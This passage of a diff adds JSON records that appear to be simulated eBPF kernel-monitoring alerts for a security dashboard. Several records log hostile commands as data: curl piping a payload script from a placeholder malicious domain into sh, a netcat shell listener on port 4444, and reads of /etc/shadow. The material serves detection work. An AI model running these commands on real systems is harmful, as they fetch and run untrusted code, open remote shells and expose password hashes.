+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 12636,
+        "ppid": 39,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.3548864754168589",
+      "timestamp": "2026-09-23T04:22:51Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 18653, Parent PPID 644) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=644 pid=18653 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 18653,
+        "ppid": 644,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.9217993602066148",
+      "timestamp": "2026-09-23T04:22:50Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 2421, Parent PPID 610) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=610 pid=2421 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 2421,
+        "ppid": 610,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.10177848827717717",
+      "timestamp": "2026-09-23T04:22:49Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on sudo",
+      "severity": "medium",
+      "details": "Process 'sudo' (PID 24223, Parent PPID 769) executed system call 'execve' with args '/usr/bin/apt-get update'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=execve ppid=769 pid=24223 comm=sudo args=/usr/bin/apt-get update status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 24223,
+        "ppid": 769,
+        "comm": "sudo",
+        "syscall": "execve",
+        "args": "/usr/bin/apt-get update",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.5273058706192223",
+      "timestamp": "2026-09-23T04:22:48Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 26541, Parent PPID 531) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=531 pid=26541 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 26541,
+        "ppid": 531,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.47443610438187045",
+      "timestamp": "2026-09-23T04:22:48Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 23736, Parent PPID 737) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=737 pid=23736 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 23736,
+        "ppid": 737,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.9329497884466808",
+      "timestamp": "2026-09-23T04:22:47Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 30893, Parent PPID 60) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=60 pid=30893 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 30893,
+        "ppid": 60,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.6216751781228599",
+      "timestamp": "2026-09-23T04:22:46Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 12101, Parent PPID 101) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=101 pid=12101 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 12101,
+        "ppid": 101,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.7335792546451326",
+      "timestamp": "2026-09-23T04:22:45Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 6864, Parent PPID 271) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=271 pid=6864 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 6864,
+        "ppid": 271,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.20019592675135633",
+      "timestamp": "2026-09-23T04:22:44Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: epoll_wait on systemd",
+      "severity": "low",
+      "details": "Process 'systemd' (PID 14935, Parent PPID 263) executed system call 'epoll_wait' with args 'maxevents: 32'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=epoll_wait ppid=263 pid=14935 comm=systemd args=maxevents: 32 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 14935,
+        "ppid": 263,
+        "comm": "systemd",
+        "syscall": "epoll_wait",
+        "args": "maxevents: 32",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.23882927928890385",
+      "timestamp": "2026-09-23T04:22:44Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 9777, Parent PPID 241) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=241 pid=9777 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 9777,
+        "ppid": 241,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.48055430053609705",
+      "timestamp": "2026-09-23T04:22:43Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: write on python3",
+      "severity": "low",
+      "details": "Process 'python3' (PID 9782, Parent PPID 195) executed system call 'write' with args 'fd: 1 (stdout), length: 14'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=write ppid=195 pid=9782 comm=python3 args=fd: 1 (stdout), length: 14 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 9782,
+        "ppid": 195,
+        "comm": "python3",
+        "syscall": "write",
+        "args": "fd: 1 (stdout), length: 14",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.5652986407482438",
+      "timestamp": "2026-09-23T04:22:42Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 4304, Parent PPID 837) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=837 pid=4304 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 4304,
+        "ppid": 837,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.84038732090009",
+      "timestamp": "2026-09-23T04:22:41Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 27717, Parent PPID 283) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=283 pid=27717 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 27717,
+        "ppid": 283,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.2946618592183581",
+      "timestamp": "2026-09-23T04:22:40Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: accept4 on nginx",
+      "severity": "low",
+      "details": "Process 'nginx' (PID 1543, Parent PPID 797) executed system call 'accept4' with args 'client: 192.168.1.55:53299'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=accept4 ppid=797 pid=1543 comm=nginx args=client: 192.168.1.55:53299 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 1543,
+        "ppid": 797,
+        "comm": "nginx",
+        "syscall": "accept4",
+        "args": "client: 192.168.1.55:53299",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.6550472295564959",
+      "timestamp": "2026-09-23T04:22:40Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: write on python3",
+      "severity": "low",
+      "details": "Process 'python3' (PID 3107, Parent PPID 857) executed system call 'write' with args 'fd: 1 (stdout), length: 14'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=write ppid=857 pid=3107 comm=python3 args=fd: 1 (stdout), length: 14 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 3107,
+        "ppid": 857,
+        "comm": "python3",
+        "syscall": "write",
+        "args": "fd: 1 (stdout), length: 14",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.14022395145986133",
+      "timestamp": "2026-09-23T04:22:39Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 6995, Parent PPID 786) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=786 pid=6995 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 6995,
+        "ppid": 786,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.5077541537591627",
+      "timestamp": "2026-09-23T04:22:38Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: epoll_wait on systemd",
+      "severity": "low",
+      "details": "Process 'systemd' (PID 12843, Parent PPID 564) executed system call 'epoll_wait' with args 'maxevents: 32'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=epoll_wait ppid=564 pid=12843 comm=systemd args=maxevents: 32 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 12843,
+        "ppid": 564,
+        "comm": "systemd",
+        "syscall": "epoll_wait",
+        "args": "maxevents: 32",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.0725643806544215",
+      "timestamp": "2026-09-23T04:22:37Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 21919, Parent PPID 686) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=686 pid=21919 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 21919,
+        "ppid": 686,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.5111174165066816",
+      "timestamp": "2026-09-23T04:22:36Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 32787, Parent PPID 882) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=882 pid=32787 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 32787,
+        "ppid": 882,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.5194137083158503",
+      "timestamp": "2026-09-23T04:22:36Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 7566, Parent PPID 673) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=673 pid=7566 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 7566,
+        "ppid": 673,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.6760156179765336",
+      "timestamp": "2026-09-23T04:22:35Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 31205, Parent PPID 293) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=293 pid=31205 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 31205,
+        "ppid": 293,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.5560597485809351",
+      "timestamp": "2026-09-23T04:22:34Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 4057, Parent PPID 288) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=288 pid=4057 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 4057,
+        "ppid": 288,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.19309805322541507",
+      "timestamp": "2026-09-23T04:22:33Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 8941, Parent PPID 178) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=178 pid=8941 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 8941,
+        "ppid": 178,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.2505967726321999",
+      "timestamp": "2026-09-23T04:22:32Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 29322, Parent PPID 789) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=789 pid=29322 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 29322,
+        "ppid": 789,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.12817403040015574",
+      "timestamp": "2026-09-23T04:22:32Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 16794, Parent PPID 679) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=679 pid=16794 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 16794,
+        "ppid": 679,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.8105597129582699",
+      "timestamp": "2026-09-23T04:22:31Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 19689, Parent PPID 343) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=343 pid=19689 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 19689,
+        "ppid": 343,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.14597300549382952",
+      "timestamp": "2026-09-23T04:22:30Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 21157, Parent PPID 662) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=662 pid=21157 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 21157,
+        "ppid": 662,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.36786065905777376",
+      "timestamp": "2026-09-23T04:22:29Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on sudo",
+      "severity": "medium",
+      "details": "Process 'sudo' (PID 6532, Parent PPID 438) executed system call 'execve' with args '/usr/bin/apt-get update'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=execve ppid=438 pid=6532 comm=sudo args=/usr/bin/apt-get update status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 6532,
+        "ppid": 438,
+        "comm": "sudo",
+        "syscall": "execve",
+        "args": "/usr/bin/apt-get update",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.8567105075964297",
+      "timestamp": "2026-09-23T04:22:28Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 18049, Parent PPID 996) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=996 pid=18049 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 18049,
+        "ppid": 996,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.7818364594781826",
+      "timestamp": "2026-09-23T04:22:28Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 27101, Parent PPID 704) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=704 pid=27101 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 27101,
+        "ppid": 704,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.6986751604520492",
+      "timestamp": "2026-09-23T04:22:27Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 19848, Parent PPID 989) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=989 pid=19848 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 19848,
+        "ppid": 989,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.8166131301917319",
+      "timestamp": "2026-09-23T04:22:26Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 18616, Parent PPID 292) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=292 pid=18616 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 18616,
+        "ppid": 292,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.4032601706831118",
+      "timestamp": "2026-09-23T04:22:25Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on sudo",
+      "severity": "medium",
+      "details": "Process 'sudo' (PID 27876, Parent PPID 927) executed system call 'execve' with args '/usr/bin/apt-get update'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=execve ppid=927 pid=27876 comm=sudo args=/usr/bin/apt-get update status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 27876,
+        "ppid": 927,
+        "comm": "sudo",
+        "syscall": "execve",
+        "args": "/usr/bin/apt-get update",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.45155278259773524",
+      "timestamp": "2026-09-23T04:22:24Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: openat on cat",
+      "severity": "high",
+      "details": "Process 'cat' (PID 14251, Parent PPID 618) executed system call 'openat' with args '/etc/shadow'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=openat ppid=618 pid=14251 comm=cat args=/etc/shadow status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 14251,
+        "ppid": 618,
+        "comm": "cat",
+        "syscall": "openat",
+        "args": "/etc/shadow",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.13487614311347007",
+      "timestamp": "2026-09-23T04:22:24Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on nc",
+      "severity": "high",
+      "details": "Process 'nc' (PID 22491, Parent PPID 696) executed system call 'execve' with args '-lvp 4444 -e /bin/sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=696 pid=22491 comm=nc args=-lvp 4444 -e /bin/sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 22491,
+        "ppid": 696,
+        "comm": "nc",
+        "syscall": "execve",
+        "args": "-lvp 4444 -e /bin/sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.9976920397090592",
+      "timestamp": "2026-09-23T04:22:23Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 30513, Parent PPID 468) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=468 pid=30513 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 30513,
+        "ppid": 468,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.5670444021601178",
+      "timestamp": "2026-09-23T04:22:22Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 21197, Parent PPID 852) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=852 pid=21197 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 21197,
+        "ppid": 852,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.09794407702285368",
+      "timestamp": "2026-09-23T04:22:21Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: setuid on bash",
+      "severity": "high",
+      "details": "Process 'bash' (PID 1652, Parent PPID 515) executed system call 'setuid' with args '0'. The engine governed-status was 'allowed'.",
+      "rawPayload": "syscall=setuid ppid=515 pid=1652 comm=bash args=0 status=allowed",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 1652,
+        "ppid": 515,
+        "comm": "bash",
+        "syscall": "setuid",
+        "args": "0",
+        "status": "allowed"
+      }
+    },
+    {
+      "id": "0.9117235613625808",
+      "timestamp": "2026-09-23T04:22:20Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 1162, Parent PPID 529) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=529 pid=1162 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
+      "notes": "Automatically archived during live eBPF telemetry simulation.",
+      "assignedOfficer": "baalbek.313@gmail.com",
+      "meta": {
+        "pid": 1162,
+        "ppid": 529,
+        "comm": "curl",
+        "syscall": "execve",
+        "args": "http://malcious-domain.com/payload.sh | sh",
+        "status": "intercepted"
+      }
+    },
+    {
+      "id": "0.07563325752719363",
+      "timestamp": "2026-09-23T04:22:20Z",
+      "category": "ebpf",
+      "name": "Kernel Intercept: execve on curl",
+      "severity": "high",
+      "details": "Process 'curl' (PID 10581, Parent PPID 473) executed system call 'execve' with args 'http://malcious-domain.com/payload.sh | sh'. The engine governed-status was 'intercepted'.",
+      "rawPayload": "syscall=execve ppid=473 pid=10581 comm=curl args=http://malcious-domain.com/payload.sh | sh status=intercepted",
+      "status": "Unresolved",
